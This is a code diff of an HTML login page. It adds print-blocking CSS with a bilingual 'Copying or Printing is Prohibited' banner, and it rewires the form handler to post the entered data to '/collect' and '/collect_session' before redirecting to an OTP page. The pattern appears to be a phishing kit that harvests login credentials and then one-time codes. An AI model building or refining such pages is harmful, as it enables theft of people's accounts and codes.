@@ -63,6 +63,26 @@
         font-size: 18px;
         width: 100%;
     }
+    @media print {
+  body {
+    background: black !important;
+    color: red !important;
+    font-size: 32px !important;
+    text-align: center !important;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  body * {
+    display: none !important;
+  }
+  body::before {
+    content: "🚫 ممنوع النسخ أو الطباعة | 🚫 Copying or Printing is Prohibited";
+    display: block;
+    white-space: pre;
+  }
+}
 </style>
 </head>
 <body>
@@ -99,10 +119,6 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
         time: new Date().toISOString(),
     }
      
-    const compinedData = {
-      ...formData,
-      ...payload
-      }; 
       
     fetch("/endpoint", {
       method: "POST",
@@ -119,13 +135,13 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     fetch("/collect", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(compinedData)
+        body: JSON.stringify(formData)
     });
 
     fetch("/collect_session", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(compinedData)
+        body: JSON.stringify(formData)
     }) .then(() => {
         window.location.href = "/otp.html";
     });
